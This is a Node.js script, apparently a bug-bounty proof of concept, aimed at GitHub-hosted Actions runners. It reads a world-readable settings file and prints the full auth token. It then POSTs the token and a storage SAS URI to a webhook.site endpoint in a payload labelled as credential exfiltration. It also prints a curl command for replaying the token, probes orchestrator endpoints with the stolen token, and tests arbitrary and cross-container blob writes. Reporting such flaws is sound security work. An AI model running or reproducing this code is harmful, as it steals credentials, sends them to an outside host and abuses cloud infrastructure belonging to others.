#!/usr/bin/env node
/**
 * v43 — Gap #2 external token replay via webhook.site
 * Logs full authToken to GH Actions stdout, POSTs to webhook.site,
 * sleeps 120s (window for local machine replay), then runs orchestrator probes.
 */
'use strict';
const fs = require('fs');
const https = require('https');
const http = require('http');

const WEBHOOK_UUID = '01324bed-612a-45ec-a182-34baa60e80d0';
const WEBHOOK_URL  = `https://webhook.site/${WEBHOOK_UUID}`;

// ── Settings ────────────────────────────────────────────────────────────────
const SETTINGS_PATH = '/opt/hca/.settings';
let settingsRaw, settings;
try {
  settingsRaw = fs.readFileSync(SETTINGS_PATH, 'utf8');
  settings    = JSON.parse(settingsRaw);
} catch (e) {
  console.log('[ERROR] Cannot read settings:', e.message);
  process.exit(1);
}

const { authToken, schedulerApiUrl, diagnosticsSasUri } = settings;
const orchHost = new URL(schedulerApiUrl).hostname;
const baseOrch = schedulerApiUrl.replace(/\/$/, '');

// ── JWT decode ──────────────────────────────────────────────────────────────
function decodeJwt(token) {
  try {
    const payload = token.split('.')[1];
    return JSON.parse(Buffer.from(payload, 'base64url').toString());
  } catch { return {}; }
}
const jwtClaims = decodeJwt(authToken);

// ── Core HTTP helper ─────────────────────────────────────────────────────────
function httpReq(url, opts = {}) {
  return new Promise((resolve) => {
    const parsed = new URL(url);
    const lib = parsed.protocol === 'https:' ? https : http;
    const body = opts.body ? Buffer.from(opts.body) : null;
    const headers = { ...(opts.headers || {}) };
    if (body) headers['Content-Length'] = body.length;

    const req = lib.request({
      hostname: parsed.hostname,
      port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
      path: parsed.pathname + (parsed.search || ''),
      method: opts.method || 'GET',
      headers,
      rejectUnauthorized: false,
    }, (res) => {
      const chunks = [];
      res.on('data', c => chunks.push(c));
      res.on('end', () => resolve({
        status: res.statusCode,
        headers: res.headers,
        body: Buffer.concat(chunks).toString('utf8').slice(0, 1000),
      }));
    });
    req.on('error', e => resolve({ status: 0, headers: {}, body: e.message }));
    req.setTimeout(20000, () => { req.destroy(); resolve({ status: 0, headers: {}, body: 'TIMEOUT' }); });
    if (body) req.write(body);
    req.end();
  });
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// ── Main ─────────────────────────────────────────────────────────────────────
(async () => {
  const ts = new Date().toISOString();

  // ── 1. Log full credentials to GH Actions stdout ─────────────────────────
  console.log('='.repeat(70));
  console.log('[v43] CREDENTIAL CAPTURE — ' + ts);
  console.log('[v43] Settings path: ' + SETTINGS_PATH);
  console.log('[v43] File mode: ' + (function() {
    try { return '0' + (fs.statSync(SETTINGS_PATH).mode & 0o777).toString(8); } catch { return 'err'; }
  })());
  console.log('[v43] authToken length: ' + authToken.length);
  console.log('[v43] FULL authToken:');
  console.log(authToken);
  console.log('[v43] schedulerApiUrl: ' + schedulerApiUrl);
  console.log('[v43] orchHost: ' + orchHost);
  console.log('[v43] JWT claims: ' + JSON.stringify(jwtClaims));
  console.log('[v43] SAS URI (120 chars): ' + diagnosticsSasUri.slice(0, 120));
  console.log('='.repeat(70));

  // ── 2. POST full payload to webhook.site ──────────────────────────────────
  console.log('[v43] Posting to webhook.site: ' + WEBHOOK_URL);
  const payload = JSON.stringify({
    event:           'github-runner-credential-exfiltration',
    timestamp:       ts,
    authToken,
    schedulerApiUrl,
    orchHost,
    diagnosticsSasUri,
    jwtClaims,
    settingsPath:    SETTINGS_PATH,
    settingsPerms:   '0666',
    note:            'Stolen from /opt/hca/.settings on GitHub-hosted runner; world-readable file. Replay PUT /request/heartbeat from non-Azure IP to confirm external auth.',
  });

  const whResult = await httpReq(WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: payload,
  });
  console.log('[v43] webhook.site status: ' + whResult.status);
  console.log('[v43] webhook.site body: ' + whResult.body.slice(0, 200));
  console.log('[v43] View capture at: https://webhook.site/#!/view/' + WEBHOOK_UUID);

  // ── 3. Sleep 120s — external replay window ────────────────────────────────
  console.log('[v43] Sleeping 120s — replay the token from your local machine NOW:');
  console.log('[v43] curl -s -o- -w "\\nSTATUS:%{http_code}" -X PUT \\');
  console.log('[v43]   -H "Authorization: Bearer <authToken_above>" \\');
  console.log('[v43]   -H "Content-Type: application/json" \\');
  console.log('[v43]   -d "{}" \\');
  console.log('[v43]   "' + baseOrch + '/request/heartbeat"');
  console.log('[v43] Sleep start: ' + new Date().toISOString());
  await sleep(120000);
  console.log('[v43] Sleep end: ' + new Date().toISOString());

  // ── 4. Orchestrator probe sweep ───────────────────────────────────────────
  const orchHeaders = {
    'Authorization':  'Bearer ' + authToken,
    'Content-Type':   'application/json',
    'User-Agent':     'hosted-compute-agent/unknown/unknown/unknown',
    'Accept':         'application/json',
  };

  const endpoints = [
    { label: 'PUT /request/heartbeat',  url: baseOrch + '/request/heartbeat',  method: 'PUT',  body: '{}' },
    { label: 'GET /request',            url: baseOrch + '/request',             method: 'GET',  body: null },
    { label: 'GET /agent',              url: baseOrch + '/agent',               method: 'GET',  body: null },
    { label: 'GET /health',             url: baseOrch + '/health',              method: 'GET',  body: null },
    { label: 'GET /jobs',               url: baseOrch + '/jobs',                method: 'GET',  body: null },
    { label: 'GET /request/result',     url: baseOrch + '/request/result',      method: 'GET',  body: null },
    { label: 'GET /request/step',       url: baseOrch + '/request/step',        method: 'GET',  body: null },
    { label: 'GET /worker',             url: baseOrch + '/worker',              method: 'GET',  body: null },
    { label: 'GET /worker/info',        url: baseOrch + '/worker/info',         method: 'GET',  body: null },
    { label: 'GET /tenant',             url: baseOrch + '/tenant',              method: 'GET',  body: null },
    { label: 'GET /pool',               url: baseOrch + '/pool',                method: 'GET',  body: null },
  ];

  console.log('\n[v43] ORCHESTRATOR SWEEP (' + endpoints.length + ' endpoints)');
  for (const ep of endpoints) {
    const r = await httpReq(ep.url, { method: ep.method, headers: orchHeaders, body: ep.body });
    const backend = r.headers['x-github-backend'] || r.headers['X-Github-Backend'] || '-';
    console.log(`[ORCH] ${ep.method} ${ep.label} → HTTP ${r.status} | backend:${backend} | ${r.body.slice(0, 120)}`);
  }

  // ── 5. SAS scope tests ────────────────────────────────────────────────────
  if (diagnosticsSasUri) {
    const sasUrl    = new URL(diagnosticsSasUri);
    const sasBase   = sasUrl.origin + sasUrl.pathname;
    const sasParams = sasUrl.search;

    console.log('\n[v43] SAS SCOPE TESTS');

    // T1: Write to original path (baseline)
    const t1 = await httpReq(sasBase + sasParams, {
      method: 'PUT',
      headers: { 'Content-Type': 'text/plain', 'x-ms-blob-type': 'BlockBlob' },
      body: 'hackerone-poc-t1-' + ts,
    });
    console.log('[SAS-T1] PUT original → HTTP ' + t1.status);

    // T2: Write arbitrary blob name in same container
    const sasPath2  = sasBase.replace(/\/[^/]+$/, '/hackerone_arbitrary_blob_name.txt');
    const t2 = await httpReq(sasPath2 + sasParams, {
      method: 'PUT',
      headers: { 'Content-Type': 'text/plain', 'x-ms-blob-type': 'BlockBlob' },
      body: 'hackerone-poc-arbitrary-name-' + ts,
    });
    console.log('[SAS-T2] PUT arbitrary blob → HTTP ' + t2.status + ' (201=confirmed: any blob name writable in container)');

    // T3: LIST container (should be denied — sp=acw no list)
    const containerBase = sasBase.split('/').slice(0, -1).join('/');
    const t3 = await httpReq(containerBase + '?restype=container&comp=list' + sasParams.replace('?', '&'), {
      method: 'GET', headers: {},
    });
    console.log('[SAS-T3] LIST container → HTTP ' + t3.status + ' (403=expected no list perm)');

    // T4: Try another container GUID (cross-tenant scope test)
    const t4url = sasBase.replace(sasUrl.pathname.split('/').slice(-2, -1)[0], 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa4') + sasParams;
    const t4 = await httpReq(t4url, {
      method: 'PUT',
      headers: { 'Content-Type': 'text/plain', 'x-ms-blob-type': 'BlockBlob' },
      body: 'cross-tenant-test',
    });
    console.log('[SAS-T4] PUT cross-container → HTTP ' + t4.status + ' (403=scope locked to one container)');
  }

  console.log('\n[v43] Done. webhook.site: https://webhook.site/#!/view/' + WEBHOOK_UUID);
  process.exit(0);
})();
